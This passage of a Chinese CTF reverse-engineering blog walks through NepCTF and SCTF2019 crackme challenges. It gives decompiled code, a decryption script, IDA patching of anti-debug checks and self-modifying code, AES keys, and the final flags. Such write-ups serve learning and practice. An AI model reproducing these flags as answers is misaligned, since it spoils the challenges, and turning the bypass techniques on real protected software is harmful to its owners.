class="keyword">break</span>;</span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v8 = (v8 + v9 * *(<span class="type">unsigned</span> __int8 *)(v9 + a1)) % <span class="number">256</span>;</span><br><span class="line">    v6 = *(_BYTE *)(v9 + a1);</span><br><span class="line">    *(_BYTE *)(v9 + a1) = *(_BYTE *)(v8 + a1);</span><br><span class="line">    *(_BYTE *)(v8 + a1) = v6;</span><br><span class="line">    v4 = (*(<span class="type">unsigned</span> __int8 *)(v8 + a1) + *(<span class="type">unsigned</span> __int8 *)(v9 + a1)) % <span class="number">256</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">2</span> )</span><br><span class="line">      v5 = *(_BYTE *)(v4 + a1) + *(_BYTE *)(i + a2);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = *(_BYTE *)(i + a2) - *(_BYTE *)(v4 + a1);</span><br><span class="line">    *(_BYTE *)(i + a2) = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密文（从main函数的v7数组转换为无符号字节）</span></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0xA2</span>, <span class="number">0x94</span>, <span class="number">0x2E</span>, <span class="number">0x8E</span>, <span class="number">0x5C</span>, <span class="number">0x95</span>, <span class="number">0x79</span>, <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0xE5</span>, <span class="number">0x36</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0xE8</span>, <span class="number">0x06</span>, <span class="number">0x33</span>, <span class="number">0x78</span>, <span class="number">0xF0</span>, <span class="number">0xD0</span>,</span><br><span class="line">    <span class="number">0x36</span>, <span class="number">0xC8</span>, <span class="number">0x73</span>, <span class="number">0x1B</span>, <span class="number">0x65</span>, <span class="number">0x40</span>, <span class="number">0xB5</span>, <span class="number">0xD4</span>, <span class="number">0xE8</span>, <span class="number">0x9C</span>,</span><br><span class="line">    <span class="number">0x65</span>, <span class="number">0xF4</span>, <span class="number">0xBA</span>, <span class="number">0x62</span>, <span class="number">0xD0</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line">key = <span class="string">b&quot;Y0u_Can&#x27;t_F1nd_Me!&quot;</span></span><br><span class="line">key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化S盒（sub_40B000的第一个循环）</span></span><br><span class="line">S = [i ^ <span class="number">0xCF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备v5数组（密钥扩展）</span></span><br><span class="line">v5 = [key[i % key_len] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_40B000的第二个循环：置换S盒</span></span><br><span class="line">v6 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v6 = (v5[i] + v6 + S[i]) % <span class="number">256</span></span><br><span class="line">    v4 = S[i]</span><br><span class="line">    S[i] = S[v6]</span><br><span class="line">    S[v6] = v4 ^ <span class="number">0xAD</span>  <span class="comment"># 注意这里的异或操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行PRGA并解密（模拟sub_401A60的逆向过程）</span></span><br><span class="line">v9 = <span class="number">0</span></span><br><span class="line">v8 = <span class="number">0</span></span><br><span class="line">plaintext_bytes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">    <span class="comment"># 更新v9和v8</span></span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    v8 = (v8 + v9 * S[v9]) % <span class="number">256</span>  <span class="comment"># 关键的v8计算</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 交换S[v9]和S[v8]</span></span><br><span class="line">    temp = S[v9]</span><br><span class="line">    S[v9] = S[v8]</span><br><span class="line">    S[v8] = temp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算密钥流字节k</span></span><br><span class="line">    v4 = (S[v8] + S[v9]) % <span class="number">256</span></span><br><span class="line">    k = S[v4]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 根据索引奇偶性解密</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:  <span class="comment"># 奇数索引：密文 = 明文 + k → 明文 = 密文 - k</span></span><br><span class="line">        plain_byte = (ciphertext[i] - k) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 偶数索引：密文 = 明文 - k → 明文 = 密文 + k</span></span><br><span class="line">        plain_byte = (ciphertext[i] + k) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line">    plaintext_bytes.append(plain_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串并输出</span></span><br><span class="line">plaintext = <span class="built_in">bytes</span>(plaintext_bytes).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密得到的flag：&quot;</span>, plaintext)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;Y0u_FiN1sH_Th1s_E3sy_Smc!!!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h2><p><a href="https://linkpwn.github.io/2025/07/15/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-jocker/">链接</a></p>
<h2 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="[SCTF2019]creakme"></a>[SCTF2019]creakme</h2><p>简述一下这里主要是反调试+smc+AES的CBC</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE ModuleHandleW; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v17; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">void</span> *v18; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp+0h] [ebp-80h]</span></span><br><span class="line">  <span class="type">void</span> *Block[<span class="number">5</span>]; <span class="comment">// [esp+10h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// [esp+24h] [ebp-5Ch]</span></span><br><span class="line">  <span class="type">void</span> *v25[<span class="number">5</span>]; <span class="comment">// [esp+28h] [ebp-58h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v26; <span class="comment">// [esp+3Ch] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> Src[<span class="number">48</span>]; <span class="comment">// [esp+40h] [ebp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp+7Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  ModuleHandleW = GetModuleHandleW(<span class="number">0</span>);</span><br><span class="line">  sub_402320(ModuleHandleW);</span><br><span class="line">  sub_4024A0();</span><br><span class="line">  v4 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;welcome to 2019 sctf&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v4, sub_402AC0);</span><br><span class="line">  sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;please input your ticket:&quot;</span>);</span><br><span class="line">  sub_402AF0(v22);</span><br><span class="line">  v25[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(v25[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  sub_401D30(v25, Src, <span class="built_in">strlen</span>(Src));</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  v5 = sub_4020D0(Block, (<span class="type">int</span>)v25);             <span class="comment">// AES的CBC模式</span></span><br><span class="line">  v6 = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  v7 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5[<span class="number">5</span>] &gt;= <span class="number">0x10u</span> )</span><br><span class="line">    v7 = (_DWORD *)*v5;</span><br><span class="line">  v8 = v5[<span class="number">4</span>];</span><br><span class="line">  v9 = aPvfqyc4ttc2uxr;</span><br><span class="line">  v10 = v8;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &lt; v8 )</span><br><span class="line">    v10 = v6;</span><br><span class="line">  v12 = v10 &lt; <span class="number">4</span>;</span><br><span class="line">  v11 = v10 - <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *v7 == *(_DWORD *)v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v7;</span><br><span class="line">      v9 += <span class="number">4</span>;</span><br><span class="line">      v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">      v11 -= <span class="number">4</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = *(_BYTE *)v7 &lt; (<span class="type">unsigned</span> __int8)*v9;</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v7 != *v9</span><br><span class="line">    || v11 != <span class="number">-3</span></span><br><span class="line">    &amp;&amp; ((v13 = *((_BYTE *)v7 + <span class="number">1</span>), v12 = v13 &lt; (<span class="type">unsigned</span> __int8)v9[<span class="number">1</span>], v13 != v9[<span class="number">1</span>])</span><br><span class="line">     || v11 != <span class="number">-2</span></span><br><span class="line">     &amp;&amp; ((v14 = *((_BYTE *)v7 + <span class="number">2</span>), v12 = v14 &lt; (<span class="type">unsigned</span> __int8)v9[<span class="number">2</span>], v14 != v9[<span class="number">2</span>])</span><br><span class="line">      || v11 != <span class="number">-1</span> &amp;&amp; (v15 = *((_BYTE *)v7 + <span class="number">3</span>), v12 = v15 &lt; (<span class="type">unsigned</span> __int8)v9[<span class="number">3</span>], v15 != v9[<span class="number">3</span>]))) )</span><br><span class="line">  &#123;</span><br><span class="line">    v16 = v12 ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_18:</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt;= v8 )</span><br><span class="line">      v16 = v6 &lt; v8;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v24 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v17 = Block[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v24 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v17 = (<span class="type">void</span> *)*((_DWORD *)Block[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(Block[<span class="number">0</span>] - v17 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v17);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = <span class="number">-1</span>;</span><br><span class="line">  Block[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">15</span>;</span><br><span class="line">  LOBYTE(Block[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v26 &gt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = v25[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v26 + <span class="number">1</span> &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v18 = (<span class="type">void</span> *)*((_DWORD *)v25[<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v25[<span class="number">0</span>] - v18 - <span class="number">4</span>) &gt; <span class="number">0x1F</span> )</span><br><span class="line">        invalid_parameter_noinfo_noreturn();</span><br><span class="line">    &#125;</span><br><span class="line">    sub_402F05(v18);</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = <span class="string">&quot;Have fun!&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    v19 = <span class="string">&quot;A forged ticket!!&quot;</span>;</span><br><span class="line">  v20 = sub_402870(<span class="built_in">std</span>::<span class="built_in">cout</span>, v19);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v20, sub_402AC0);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>AES的CBC怎么看出来的，emmm,我暂时没深入了解这个加密，所以问ai的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __thiscall <span class="title function_">sub_402320</span><span class="params">(_DWORD *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int16 v2; <span class="comment">// bx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = this[<span class="number">15</span>];</span><br><span class="line">  v2 = *(_WORD *)((<span class="type">char</span> *)this + v1 + <span class="number">6</span>);</span><br><span class="line">  v3 = (<span class="type">char</span> *)this + v1 + <span class="number">248</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">strcmp</span>(v3, <span class="string">&quot;.SCTF&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v5 = v5 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      DebugBreak();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 += <span class="number">40</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4024A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> NtGlobalFlag; <span class="comment">// [esp+10h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  NtGlobalFlag = NtCurrentPeb()-&gt;NtGlobalFlag;</span><br><span class="line">  <span class="keyword">if</span> ( NtCurrentPeb()-&gt;BeingDebugged || NtGlobalFlag == <span class="number">112</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-5</span>);</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (*)(<span class="type">void</span>))dword_404000[<span class="number">0</span>])();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个是反调试，这个比NepCTF好多了。至少反调试容易找到wuuuuu~~~~</p>
<p>和nep一样直接patch掉反调试，当然你也可以动调的时候改变ZF来改变线程的走向。</p>
<p>绕过反调试，但是到了call就会报错404000。</p>
<p>这里参考大佬的用IDA的python脚本来手动还原</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_402450</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a4 &gt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">      <span class="keyword">if</span> ( result &gt;= a2 )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( result &lt; a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = aSycloversyclov[v7++];</span><br><span class="line">      *(_BYTE *)(result + a1) = ~(*(_BYTE *)(result + a1) ^ v8);</span><br><span class="line">      ++result;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= a4 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>找到smc的地方，用脚本来还原</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add1=<span class="number">0x404000</span></span><br><span class="line">add2=<span class="number">0x405000</span></span><br><span class="line">key=<span class="string">&quot;sycloversyclover&quot;</span></span><br><span class="line">bb=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(add1,add2,<span class="number">1</span>):</span><br><span class="line">    wr=(~(idc.get_wide_byte(i) ^ <span class="built_in">ord</span>(key[bb%<span class="built_in">len</span>(key)]))&amp;<span class="number">0xff</span>) <span class="comment">#这里&amp;0xff是避免取反时高位补一</span></span><br><span class="line">    ida_bytes.patch_byte(i,wr) </span><br><span class="line">    bb+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">sub_404000</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// dl</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr); ++i )</span><br><span class="line">    --aPvfqyc4ttc2uxr[i];</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">  <span class="keyword">if</span> ( (result &amp; <span class="number">0xFFFFFFFE</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = result - v1;</span><br><span class="line">      v4 = *(_BYTE *)(v3 + <span class="number">4231191</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">4231191</span>) = aPvfqyc4ttc2uxr[v1];</span><br><span class="line">      aPvfqyc4ttc2uxr[v1++] = v4;</span><br><span class="line">      result = <span class="built_in">strlen</span>(aPvfqyc4ttc2uxr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v1 &lt; result &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密得到nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo&#x3D;</p>
<p>最后秘钥为sycloversyclover，偏移量为sctfsctfsctfsctf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sctf&#123;Ae3_C8c_I28_pKcs79ad4&#125;</span><br></pre></td></tr></table></figure>



